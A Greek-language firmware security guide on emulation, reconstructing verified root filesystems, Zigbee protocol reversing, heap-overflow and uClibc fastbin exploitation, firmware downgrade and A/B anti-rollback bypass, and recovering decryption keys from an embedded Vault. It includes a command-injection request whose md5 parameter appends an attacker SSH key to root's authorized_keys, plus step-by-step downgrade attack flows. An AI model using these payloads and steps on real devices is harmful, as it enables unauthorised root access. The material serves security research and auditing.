Η διαδικασία emulation του firmware επιτρέπει **dynamic analysis** είτε της λειτουργίας μιας συσκευής είτε ενός μεμονωμένου προγράμματος. Αυτή η προσέγγιση μπορεί να συναντήσει δυσκολίες λόγω εξαρτήσεων από το hardware ή την αρχιτεκτονική, αλλά η μεταφορά του root filesystem ή συγκεκριμένων binaries σε μια συσκευή με ίδια αρχιτεκτονική και endianness, όπως ένα Raspberry Pi, ή σε μια προεγκατεστημένη εικονική μηχανή, μπορεί να διευκολύνει περαιτέρω δοκιμές.

### Emulating Individual Binaries

Για την εξέταση μεμονωμένων προγραμμάτων, είναι κρίσιμο να προσδιοριστούν το endianness και η αρχιτεκτονική CPU του προγράμματος.

#### Παράδειγμα με αρχιτεκτονική MIPS

Για emulation ενός binary με αρχιτεκτονική MIPS, μπορείτε να χρησιμοποιήσετε την εντολή:

```bash
file ./squashfs-root/bin/busybox
```

Και για να εγκαταστήσετε τα απαραίτητα εργαλεία εξομοίωσης:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Για MIPS (big-endian), χρησιμοποιείται το `qemu-mips`, ενώ για δυαδικά αρχεία little-endian, η επιλογή θα ήταν το `qemu-mipsel`.

#### Εξομοίωση αρχιτεκτονικής ARM

Για δυαδικά αρχεία ARM, η διαδικασία είναι παρόμοια, με τη χρήση του εξομοιωτή `qemu-arm`.

### Εξομοίωση πλήρους συστήματος

Εργαλεία όπως τα [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) και άλλα διευκολύνουν την πλήρη εξομοίωση firmware, αυτοματοποιώντας τη διαδικασία και βοηθώντας στη δυναμική ανάλυση.

### Ανακατασκευή διαχωρισμένων και επαληθευμένων root filesystem για εξομοίωση

Αν το superblock του SquashFS είναι αναγνώσιμο, αλλά οι μετατοπίσεις των inode, directory ή fragment table δεν είναι εφικτές, μην τροποποιήσετε αμέσως το `unsquashfs`. Κάντε reverse engineering στο δυαδικό αρχείο πρώιμης εκκίνησης και αναπαραγάγετε το γράφημα block device που δημιουργεί: τα ενσωματωμένα συστήματα μπορεί να εκθέτουν ένα ονομαστικό root partition, αλλά να δημιουργούν το πραγματικό filesystem με μια αντιστοίχιση `dm-linear` που προσθέτει sectors δανεισμένα από άλλο partition. Οι έλεγχοι μόνο του superblock μπορεί να πετύχουν, ακόμα κι όταν όλα τα επόμενα blocks μεταδεδομένων βρίσκονται σε λάθος θέση.<sup>[[11]](#references)</sup>

Διατηρήστε ακριβώς τους αριθμητικούς υπολογισμούς του firmware. Συγκεκριμένα, εξακριβώστε αν τα μήκη εκφράζονται σε bytes, sectors των 512 byte ή σελίδες των 4 KiB· αναπαραγάγετε τις μετατοπίσεις bit και την αποκοπή με την αρχική τους σειρά· και λάβετε υπόψη τις περιοχές τέλους που εξαρτώνται από την τράπεζα σε διατάξεις A/B. Για παράδειγμα, το `(partition_bytes >> 12) << 3` πρώτα αποκόπτει σε όριο 4 KiB και μετά εκφράζει το αποτέλεσμα σε sectors των 512 byte· η αντικατάστασή του με `partition_bytes // 512` μπορεί να μετακινήσει την προσαρτημένη έκταση κατά μερικά kilobytes και να καταστρέψει όλους τους επόμενους πίνακες του SquashFS.<sup>[[11]](#references)</sup>

Μια χρήσιμη διαδικασία επικύρωσης είναι η εξής:<sup>[[11]](#references)</sup>

1. Ανακτήστε από το δυαδικό αρχείο verifier/init τη συσκευή προέλευσης, το αρχικό sector και το μήκος κάθε τμήματος `dm-linear`.
2. Συνενώστε ή αντιστοιχίστε τις εκτάσεις χωρίς να αλλάξετε τη σημασιολογία της ευθυγράμμισής τους.
3. Αν η εξαγωγή εξακολουθεί να αποτυγχάνει, κάντε αναζήτηση μόνο σε ένα μικρό εύρος γύρω από το προβλεπόμενο όριο και απαιτήστε αρκετές διαδοχικές έγκυρες δομές μεταδεδομένων, αντί να αποδεχτείτε μόνο ένα πιθανό superblock.
4. Εκτελέστε ένα μη τροποποιημένο `unsquashfs` στο ανακατασκευασμένο image· η επιτυχής διάσχιση όλων των directories και fragments αποτελεί ισχυρότερη ένδειξη από το `unsquashfs -stat`.

#### Αντικατάσταση dm-verity ελεγχόμενη από τον αναλυτή

Όταν ο αναλυτής ελέγχει τον πυρήνα QEMU, το initramfs και τους εικονικούς δίσκους, μπορεί να εκκινηθεί ένα τροποποιημένο root αντικαθιστώντας το PID 1 επαλήθευσης του προμηθευτή με ένα μικρό, στατικά συνδεδεμένο init. Πρόκειται για **αντικατάσταση της αλυσίδας εκκίνησης σε εργαστηριακό περιβάλλον**, όχι για παραβίαση του dm-verity, της υπογραφής RSA, του Secure Boot ή ενός κλειδιού που είναι σφραγισμένο από TPM.<sup>[[11]](#references)</sup>

Το init αντικατάστασης θα πρέπει να αναπαράγει τα λειτουργικά βήματα της αρχικής διαδρομής εκκίνησης: να προσαρτήσει το `devtmpfs`, να καλέσει το `setsid()`, να συνδέσει το `/dev/console` με τους file descriptors 0–2, να προσαρτήσει τα `/proc` και `/sys`, να περιμένει τη διαθέσιμη block device, να προσαρτήσει το τροποποιημένο root μόνο για ανάγνωση, να αποσυνδέσει τα pseudo-filesystem του παλιού root, να μετακινήσει το νέο mount στο `/`, να εκτελέσει `chroot` και να καλέσει το `execve()` για το αρχικό `/sbin/init` του firmware. Η αποσύνδεση των `/dev`, `/proc` και `/sys` **πριν** από το `MS_MOVE` αποτρέπει την ακούσια αποσύνδεση σημείων προσάρτησης που ανήκουν στο νέο root.<sup>[[11]](#references)</sup>

Διατηρήστε την τροποποιήσιμη κατάσταση της συσκευής ξεχωριστά από το τροποποιημένο, αμετάβλητο root. Ένα overlay qcow2 μπορεί να διατηρήσει την κατάσταση LVM του αρχικού δίσκου, ενώ ένας δεύτερος virtio δίσκος, μόνο για ανάγνωση, παρέχει το τροποποιημένο SquashFS:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Αποσφαλμάτωση κατάστασης εικόνας εκτός σύνδεσης

Επιθεωρήστε την επίμονη κατάσταση εκτός του guest όταν οι αργές εκκινήσεις, τα καταστροφικά startup scripts ή η αναξιόπιστη καταγραφή από την κονσόλα αποκρύπτουν την αστοχία. Μην προσαρτάτε ποτέ ένα overlay που χρησιμοποιεί μια εκτελούμενη VM· εκθέστε το με qemu-nbd, περιορίστε την ανακάλυψη LVM στο προβλεπόμενο partition NBD και απενεργοποιήστε την ομάδα τόμων πριν την αποσύνδεσή της.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Για επαναλήψιμη απομόνωση σφαλμάτων, γράφετε αρχεία-δείκτες με χρονικές σημάνσεις σε έναν σταθερό, εγγράψιμο τόμο και επαληθεύστε τα εκτός σύνδεσης· τα `/dev/kmsg`, τα FIFO και οι παροδικές κονσόλες μπορεί να προκαλέσουν ψευδώς αρνητικά αποτελέσματα λόγω περιορισμού ρυθμού ή πρόωρου τερματισμού διεργασιών. Επίσης, συγκρίνετε τις ακριβείς διεπαφές μεταξύ των επιπέδων πριν αλλάξετε άσχετο κώδικα: το `uname -r` έναντι του `/lib/modules/`, τις δυνατότητες του ext4 στον δίσκο έναντι της διαμόρφωσης του kernel και τη γενιά του Mesa `libGL` έναντι του ABI του DRI driver και των ονομάτων driver που προκύπτουν από το PCI. Ένα στοιχείο μπορεί να υπάρχει, ακόμη και να φορτώνεται επιτυχώς μέσω `dlopen()`, αλλά να παραμένει μη χρησιμοποιήσιμο επειδή ο καταναλωτής του αναμένει διαφορετικό ABI.<sup>[[11]](#references)</sup>

### Αντιστοίχιση μηνυμάτων Zigbee / radio-co-processor

Στους IoT hubs, το RF stack συχνά διαμοιράζεται μεταξύ ενός **radio MCU** και μιας διεργασίας Linux userland. Μια χρήσιμη ροή εργασίας είναι να χαρτογραφήσετε τη διαδρομή:<sup>[[8]](#references)</sup>

1. **RF frame** στον αέρα
2. **controller-side parser** στο radio MCU
3. **serial/UART text ή TLV protocol** που προωθείται στο Linux (για παράδειγμα `/dev/tty*`)
4. **application dispatcher** στον κύριο daemon
5. **protocol-specific handler / state machine**

Αυτή η αρχιτεκτονική δημιουργεί δύο στόχους για reverse engineering αντί για έναν. Αν ο controller μετατρέπει τα binary radio frames σε textual protocol, όπως `Group,Command,arg1,arg2,...`, ανακτήστε:

- Τις **ομάδες μηνυμάτων** και τους dispatch tables
- Ποια μηνύματα μπορούν να προέρχονται από το **network** και ποια από τον ίδιο τον controller
- Τα ακριβή **manufacturer-specific discriminator fields** (για παράδειγμα, Zigbee `manufacturer_code` και custom `cluster_command`)
- Ποιοι handlers είναι προσβάσιμοι μόνο κατά τις φάσεις **commissioning**, discovery ή λήψης firmware/model

Ειδικά για το Zigbee, καταγράψτε την κίνηση σύζευξης και ελέγξτε αν ο στόχος εξακολουθεί να βασίζεται στο προεπιλεγμένο **Link Key** `ZigBeeAlliance09`. Αν ισχύει αυτό, η υποκλοπή της κίνησης commissioning μπορεί να αποκαλύψει το **Network Key**. Οι install codes του Zigbee 3.0 μειώνουν αυτή την έκθεση, οπότε σημειώστε αν η συσκευή που δοκιμάζετε τους επιβάλλει πράγματι.

### Manufacturer-specific protocol handlers και προσβασιμότητα μέσω FSM

Οι εντολές Zigbee/ZCL ειδικές για τον κατασκευαστή αποτελούν συχνά καλύτερο στόχο από τα τυποποιημένα clusters, επειδή τροφοδοτούν **custom parsing code** και εσωτερικά **FSMs** με λιγότερο δοκιμασμένη επικύρωση.<sup>[[8]](#references)</sup>

Πρακτική ροή εργασίας:

- Κάντε reverse engineering στον command dispatcher μέχρι να εντοπίσετε τον **vendor-only handler**.
- Ανακτήστε τους πίνακες **FSM state**, **event**, **check**, **action** και **next-state**.
- Εντοπίστε τις **transitional states** που προχωρούν αυτόματα, καθώς και τα retry/error branches που τελικά επαναφέρουν ή απελευθερώνουν state ελεγχόμενο από τον επιτιθέμενο.
- Επιβεβαιώστε ποιες νόμιμες ανταλλαγές πρωτοκόλλου απαιτούνται για να φτάσει ο daemon στην ευάλωτη κατάσταση, αντί να υποθέτετε ότι ο προβληματικός handler είναι πάντα προσβάσιμος.

Για πρωτόκολλα ευαίσθητα στον χρονισμό, η επανάληψη πακέτων από ένα Python framework μπορεί να είναι υπερβολικά αργή. Μια πιο αξιόπιστη προσέγγιση είναι να προσομοιώσετε μια νόμιμη συσκευή σε πραγματικό hardware (για παράδειγμα **nRF52840**) με vendor-grade stack, ώστε να εμφανίζονται τα σωστά **endpoints**, **attributes** και ο σωστός χρονισμός του commissioning.

### Κατηγορία σφαλμάτων fragmented-download σε embedded daemons

Μια επαναλαμβανόμενη κατηγορία σφαλμάτων firmware εμφανίζεται σε λήψεις **fragmented blob/model/configuration**:<sup>[[8]](#references)</sup>

1. Το **πρώτο fragment** (`offset == 0`) αποθηκεύει το `ctx->total_size` και δεσμεύει μνήμη με `malloc(total_size)`.
2. Τα επόμενα fragments επικυρώνουν μόνο τα ελεγχόμενα από τον επιτιθέμενο **packet-local** πεδία, όπως `packet_total_size >= offset + chunk_len`.
3. Η αντιγραφή χρησιμοποιεί `memcpy(&ctx->buffer[offset], chunk, chunk_len)` χωρίς έλεγχο έναντι του **αρχικού μεγέθους της δεσμευμένης μνήμης**.

Έτσι, ένας επιτιθέμενος μπορεί να στείλει:

- Ένα έγκυρο πρώτο fragment με **μικρό** δηλωμένο συνολικό μέγεθος, ώστε να προκαλέσει μικρή heap allocation.
- Ένα μεταγενέστερο fragment με το **αναμενόμενο offset**, αλλά μεγαλύτερο `chunk_len`.
- Ένα πλαστογραφημένο packet-local μέγεθος που περνά τους νέους ελέγχους, ενώ εξακολουθεί να προκαλεί υπερχείλιση του αρχικά δεσμευμένου buffer.

Όταν η ευάλωτη διαδρομή βρίσκεται πίσω από λογική commissioning, η εκμετάλλευση πρέπει να περιλαμβάνει αρκετή **προσομοίωση συσκευής** ώστε να οδηγήσει τον στόχο στην αναμενόμενη κατάσταση λήψης model ή blob πριν από την αποστολή των κακοσχηματισμένων fragments.

### Ενεργοποίηση `free()` μέσω πρωτοκόλλου

Σε embedded daemons, ο ευκολότερος τρόπος να ενεργοποιηθεί εκμετάλλευση heap metadata συχνά δεν είναι να «περιμένετε τον καθαρισμό», αλλά να **εξαναγκάσετε τον χειρισμό σφαλμάτων του ίδιου του πρωτοκόλλου**:<sup>[[8]](#references)</sup>

- Στείλτε κακοσχηματισμένα επόμενα fragments για να οδηγήσετε το FSM σε καταστάσεις **retry** ή **error**.
- Υπερβείτε το όριο επαναλήψεων, ώστε ο daemon να **επαναφέρει το context** και να απελευθερώσει το αλλοιωμένο buffer.
- Χρησιμοποιήστε αυτό το προβλέψιμο `free()` για να ενεργοποιήσετε primitives στην πλευρά του allocator πριν καταρρεύσει η διεργασία για άσχετους λόγους.

Αυτό είναι ιδιαίτερα χρήσιμο απέναντι σε allocators **musl/uClibc/dlmalloc-like** σε embedded Linux, όπου η αλλοίωση chunk metadata μπορεί να μετατρέψει τη λογική unlink/unbin σε primitive εγγραφής. Ένα σταθερό μοτίβο είναι να αλλοιώσετε ένα **size field**, ώστε να ανακατευθύνετε τη διαδρομή του allocator σε **fake chunks που έχουν τοποθετηθεί μέσα στο buffer που υπερχείλισε**, αντί να καταστρέψετε αμέσως πραγματικούς δείκτες bin και να καταρρεύσει η διεργασία.

## Binary exploitation και proof-of-concept

Η ανάπτυξη PoC για εντοπισμένες ευπάθειες απαιτεί βαθιά κατανόηση της αρχιτεκτονικής του στόχου και προγραμματισμό σε γλώσσες χαμηλού επιπέδου. Οι προστασίες runtime των binaries είναι σπάνιες σε embedded συστήματα, αλλά όταν υπάρχουν, μπορεί να χρειαστούν τεχνικές όπως το Return Oriented Programming (ROP).

### Σημειώσεις εκμετάλλευσης uClibc fastbin (embedded Linux)

- **Fastbins + consolidation:** Το uClibc χρησιμοποιεί fastbins παρόμοια με το glibc. Μια μεταγενέστερη μεγάλη allocation μπορεί να ενεργοποιήσει το `__malloc_consolidate()`, επομένως κάθε fake chunk πρέπει να περνά τους ελέγχους (λογικό μέγεθος, `fd = 0` και γειτονικά chunks που θεωρούνται «σε χρήση»).<sup>[[6]](#references)</sup>
- **Binaries χωρίς PIE υπό ASLR:** αν είναι ενεργό το ASLR αλλά το κύριο binary είναι **non-PIE**, οι διευθύνσεις `.data/.bss` εντός του binary παραμένουν σταθερές. Μπορείτε να στοχεύσετε μια περιοχή που ήδη μοιάζει με έγκυρη κεφαλίδα heap chunk, ώστε μια fastbin allocation να καταλήξει σε έναν **function pointer table**.
- **NUL που σταματά τον parser:** κατά την ανάλυση JSON, ένα `\x00` στο payload μπορεί να σταματήσει την ανάλυση, διατηρώντας παράλληλα τα επόμενα byte που ελέγχει ο επιτιθέμενος για stack pivot/ROP chain.
- **Shellcode μέσω `/proc/self/mem`:** μια ROP chain που καλεί `open("/proc/self/mem")`, `lseek()` και `write()` μπορεί να τοποθετήσει εκτελέσιμο shellcode σε γνωστή memory mapping και να μεταβεί σε αυτό.

## Επιθέσεις υποβάθμισης firmware και μη ασφαλείς μηχανισμοί ενημέρωσης

Ακόμη και όταν ένας κατασκευαστής υλοποιεί ελέγχους κρυπτογραφικών υπογραφών για images firmware, συχνά παραλείπεται η **προστασία από επαναφορά έκδοσης (υποβάθμιση)**. Όταν ο boot- ή recovery-loader επαληθεύει μόνο την υπογραφή με ενσωματωμένο δημόσιο κλειδί, αλλά δεν συγκρίνει την *έκδοση* (ή έναν μονοτονικό μετρητή) του image που εγκαθίσταται, ένας επιτιθέμενος μπορεί νόμιμα να εγκαταστήσει **παλαιότερο, ευάλωτο firmware που εξακολουθεί να φέρει έγκυρη υπογραφή**, επαναφέροντας έτσι ευπάθειες που είχαν διορθωθεί.<sup>[[4]](#references)</sup>

Τυπική ροή επίθεσης:

1. **Αποκτήστε ένα παλαιότερο υπογεγραμμένο image**
   * Κατεβάστε το από τη δημόσια πύλη λήψεων, το CDN ή τον ιστότοπο υποστήριξης του κατασκευαστή.
   * Εξαγάγετέ το από συνοδευτικές εφαρμογές για κινητά/υπολογιστές (π.χ. από το `assets/firmware/` μέσα σε Android APK).
   * Ανακτήστε το από αποθετήρια τρίτων, όπως το VirusTotal, αρχεία του Internet, forums κ.λπ.
2. **Μεταφορτώστε ή διαθέστε το image στη συσκευή** μέσω οποιουδήποτε εκτεθειμένου καναλιού ενημέρωσης:
   * Web UI, mobile-app API, USB, TFTP, MQTT κ.λπ.
   * Πολλές καταναλωτικές συσκευές IoT εκθέτουν endpoints HTTP(S) *χωρίς έλεγχο ταυτότητας*, τα οποία δέχονται firmware blobs κωδικοποιημένα σε Base64, τα αποκωδικοποιούν στην πλευρά του server και ενεργοποιούν διαδικασία recovery/upgrade.
3. Μετά την υποβάθμιση, εκμεταλλευτείτε μια ευπάθεια που διορθώθηκε σε νεότερη έκδοση (για παράδειγμα, ένα φίλτρο command-injection που προστέθηκε αργότερα).
4. Προαιρετικά, εγκαταστήστε ξανά το πιο πρόσφατο image ή απενεργοποιήστε τις ενημερώσεις, ώστε να αποφύγετε τον εντοπισμό αφού αποκτήσετε persistence.

### Παράδειγμα: Command injection μετά από υποβάθμιση

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

Στο ευάλωτο (υποβαθμισμένο) firmware, η παράμετρος `md5` συνενώνεται απευθείας σε μια εντολή shell χωρίς εξυγίανση, επιτρέποντας την εισαγωγή αυθαίρετων εντολών (εδώ — την ενεργοποίηση πρόσβασης root μέσω SSH key). Σε μεταγενέστερες εκδόσεις του firmware προστέθηκε ένα βασικό φίλτρο χαρακτήρων, αλλά η απουσία προστασίας από downgrade καθιστά τη διόρθωση άχρηστη.<sup>[[4]](#references)</sup>

### Εξαγωγή Firmware Από Εφαρμογές Κινητών

Πολλοί προμηθευτές συμπεριλαμβάνουν πλήρεις εικόνες firmware στις συνοδευτικές εφαρμογές τους για κινητά, ώστε η εφαρμογή να μπορεί να ενημερώνει τη συσκευή μέσω Bluetooth/Wi-Fi. Αυτά τα πακέτα αποθηκεύονται συνήθως χωρίς κρυπτογράφηση στο APK/APEX, σε διαδρομές όπως `assets/fw/` ή `res/raw/`. Εργαλεία όπως τα `apktool`, `ghidra` ή ακόμα και το απλό `unzip` σάς επιτρέπουν να εξαγάγετε υπογεγραμμένες εικόνες χωρίς να αγγίξετε το φυσικό υλικό.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Παράκαμψη anti-rollback μόνο μέσω updater σε σχεδιασμούς A/B slot

Ορισμένοι κατασκευαστές υλοποιούν πράγματι ένα **ratchet** κατά του downgrade, αλλά μόνο στη λογική του *updater* (για παράδειγμα, σε μια ρουτίνα UDS μέσω CAN, σε μια εντολή recovery ή σε έναν OTA agent στο userspace). Αν αργότερα ο **bootloader** ελέγχει μόνο την υπογραφή/CRC της εικόνας και εμπιστεύεται τον πίνακα partitions ή τα metadata του slot, η προστασία από rollback εξακολουθεί να μπορεί να παρακαμφθεί.<sup>[[7]](#references)</sup>

Τυπικός αδύναμος σχεδιασμός:

- Τα metadata του firmware περιλαμβάνουν τόσο έναν περιγραφέα έκδοσης όσο και ένα **security ratchet** / monotonic counter.
- Ο updater συγκρίνει το ratchet της εικόνας με μια τιμή αποθηκευμένη σε persistent storage και απορρίπτει παλαιότερες υπογεγραμμένες εικόνες.
- Ο bootloader **δεν** αναλύει αυτό το ratchet και επαληθεύει μόνο την κεφαλίδα, το CRC και την υπογραφή πριν εκκινήσει το επιλεγμένο slot.
- Η ενεργοποίηση του slot αποθηκεύεται ξεχωριστά, σε έναν πίνακα partitions ή σε έναν μετρητή generation ανά slot, και **δεν είναι κρυπτογραφικά δεσμευμένη** στο ακριβές firmware digest που επικυρώθηκε.

Αυτό δημιουργεί ένα primitive **επικύρωσης μίας εικόνας / εκκίνησης άλλης εικόνας** σε συστήματα dual-slot. Αν ο attacker μπορεί να κάνει τον updater να ορίσει το slot B ως επόμενο στόχο εκκίνησης χρησιμοποιώντας μια τρέχουσα υπογεγραμμένη εικόνα και στη συνέχεια να αντικαταστήσει το slot B πριν από την επανεκκίνηση, ο bootloader ενδέχεται και πάλι να εκκινήσει την υποβαθμισμένη εικόνα, επειδή εμπιστεύεται μόνο τα metadata του slot που έχουν ήδη οριστικοποιηθεί.

Συνήθης τρόπος εκμετάλλευσης:

1. Ανέβασε ένα **τρέχον υπογεγραμμένο** firmware στο παθητικό slot και εκτέλεσε την κανονική ρουτίνα επικύρωσης/εναλλαγής, ώστε η διάταξη να ορίσει αυτό το slot ως το επόμενο ενεργό.
2. **Μην κάνεις ακόμη επανεκκίνηση**. Επανεκτέλεσε τη ρουτίνα προετοιμασίας/διαγραφής slot στην ίδια συνεδρία.
3. Εκμεταλλεύσου παρωχημένη κατάσταση εκκίνησης ή παρωχημένη λογική επιλογής slot, ώστε ο updater να διαγράψει το **ίδιο φυσικό slot** που μόλις προήγαγε.
4. Γράψε ένα **παλαιότερο αλλά ακόμη υπογεγραμμένο** firmware σε αυτό το slot.
5. Παράλειψε τη ρουτίνα επικύρωσης που επιβάλλει το ratchet και κάνε απευθείας επανεκκίνηση.
6. Ο bootloader επιλέγει το slot που προήχθη, επαληθεύει μόνο την υπογραφή/ακεραιότητα και εκκινεί την παλιά εικόνα.

Τι να αναζητήσεις κατά το reverse engineering υλοποιήσεων ενημέρωσης A/B:

- Επιλογή slot που προκύπτει από **flags κατά την εκκίνηση**, τα οποία δεν ανανεώνονται μετά από επιτυχή εναλλαγή.
- Ρουτίνα τύπου `prepare_passive_slot()` που διαγράφει ένα slot με βάση παρωχημένη κατάσταση αντί για την **τρέχουσα οριστικοποιημένη διάταξη**.
- Συνάρτηση τύπου `part_write_layout()` που απλώς αυξάνει έναν **μετρητή generation** / ενεργό flag και δεν αποθηκεύει το hash της εικόνας που επικυρώθηκε.
- Έλεγχοι ratchet που υλοποιούνται σε userspace ή στον κώδικα του updater, αλλά **όχι** στα στάδια ROM / bootloader / secure boot.
- Ρουτίνες διαγραφής ή recovery που αφήνουν το slot σημειωμένο ως εκκινήσιμο, ακόμη και αφού το περιεχόμενό του διαγραφεί και ξαναγραφτεί.

### Checklist για την αξιολόγηση της λογικής ενημέρωσης

* Προστατεύονται επαρκώς η μεταφορά και η αυθεντικοποίηση του *update endpoint* (TLS + authentication);
* Συγκρίνει η συσκευή **αριθμούς έκδοσης** ή έναν **monotonic anti-rollback counter** πριν από το flashing;
* Επαληθεύεται η εικόνα μέσα σε μια αλυσίδα secure boot (π.χ. ελέγχονται οι υπογραφές από κώδικα ROM);
* Επιβάλλει ο **bootloader το ίδιο ratchet** με τον updater, αντί να ελέγχει μόνο υπογραφή/CRC;
* Είναι τα metadata ενεργοποίησης του slot **δεσμευμένα στο επικυρωμένο firmware digest/έκδοση** ή μπορεί να τροποποιηθεί ένα slot μετά την προαγωγή του;
* Μετά από επιτυχή εναλλαγή slot, αναγκάζεται η συσκευή να κάνει επανεκκίνηση ή παραμένουν προσβάσιμες οι επόμενες ρουτίνες ενημέρωσης/διαγραφής στην ίδια συνεδρία;
* Εκτελεί ο κώδικας του userland πρόσθετους ελέγχους λογικής (π.χ. επιτρεπόμενος χάρτης partitions, αριθμός μοντέλου);
* Επαναχρησιμοποιούν οι ροές ενημέρωσης *μερικής* ή *αντιγράφου ασφαλείας* την ίδια λογική επικύρωσης;

> 💡  Αν λείπει οποιοδήποτε από τα παραπάνω, η πλατφόρμα είναι πιθανότατα ευάλωτη σε rollback attacks.

## Ανάκτηση κλειδιών αποκρυπτογράφησης firmware από ενσωματωμένη κατάσταση KMS/Vault

Όταν μια εικόνα ενημέρωσης συνδυάζει μικρά metadata σε plaintext με ένα μεγάλο blob υψηλής εντροπίας, κάνε πρώτα triage του container πριν δοκιμάσεις brute force:<sup>[[1]](#references)</sup>

- Εξήγαγε κεφαλίδες, offsets και όρια γραμμών με `hexdump`, `xxd`, `strings -tx`, `base64 -d` και `binwalk -E`.
- Το `Salted__` συνήθως υποδεικνύει format OpenSSL `enc`: τα επόμενα 8 bytes είναι το salt και τα υπόλοιπα bytes είναι ciphertext.
- Ένα πεδίο Base64 που αποκωδικοποιείται σε ακριβώς `256` bytes αποτελεί ισχυρή ένδειξη ότι πρόκειται για ciphertext RSA-2048 που κρυπτογραφεί ένα τυχαίο password/session key του firmware.
- Υλικό PGP αποσπασμένο από το ίδιο αρχείο συχνά προστατεύει μόνο τη γνησιότητα· μην υποθέσεις ότι χρησιμοποιείται για την εμπιστευτικότητα.

Αν αποτύχει η στατική αναζήτηση κλειδιών (`grep`, `strings`, αναζητήσεις PEM/PGP), κάνε reverse engineering της **λειτουργικής διαδρομής αποκρυπτογράφησης** αντί να ψάχνεις μόνο για private keys:

- Κάνε decompile το binary του updater / management και εντόπισε ποιος διαβάζει το κρυπτογραφημένο blob, ποιο helper/API το ξετυλίγει και ποιο λογικό όνομα κλειδιού ζητά.
- Αναζήτησε στο εξαχθέν root filesystem κατάσταση KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), καθώς και unit files και init scripts.
- Θεώρησε plaintext `vault operator unseal ...`, recovery keys, bootstrap tokens ή τοπικά scripts αυτόματου unseal του KMS ισοδύναμα με υλικό private key.

Αν η συσκευή περιλαμβάνει το αρχικό binary του Vault και το storage backend, η αναπαραγωγή αυτού του περιβάλλοντος είναι συνήθως ευκολότερη από την επανυλοποίηση των εσωτερικών λειτουργιών του Vault:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Με root στο cloned KMS:

- Κάντε τα transit keys exportable μόνο μέσα στο απομονωμένο clone: `vault write transit/keys/<name>/config exportable=true`
- Κάντε export το unwrap key: `vault read transit/export/encryption-key/<name>`
- Δοκιμάστε το ανακτημένο RSA key με το ακριβές ζεύγος padding/hash που χρησιμοποιεί το KMS. Αποτυχία αποκρυπτογράφησης με PKCS#1 v1.5 και αποτυχία της προεπιλεγμένης αποκρυπτογράφησης OAEP **δεν** αποδεικνύουν ότι το key είναι λάθος· πολλές ροές που βασίζονται στο Vault χρησιμοποιούν OAEP με SHA-256, ενώ οι συνήθεις βιβλιοθήκες έχουν ως προεπιλογή το SHA-1.
- Αν το payload ξεκινά με `Salted__`, αναπαράγετε ακριβώς το OpenSSL KDF του κατασκευαστή (`EVP_BytesToKey`, συχνά MD5 σε παλαιότερες συσκευές) πριν επιχειρήσετε αποκρυπτογράφηση AES-CBC.

Έτσι, το «κρυπτογραφημένο firmware» γίνεται ένα πιο γενικό πρόβλημα: **ανακτήστε τα operational keys της συσκευής και, στη συνέχεια, αναπαράγετε offline τις ακριβείς παραμέτρους unwrap + KDF**.
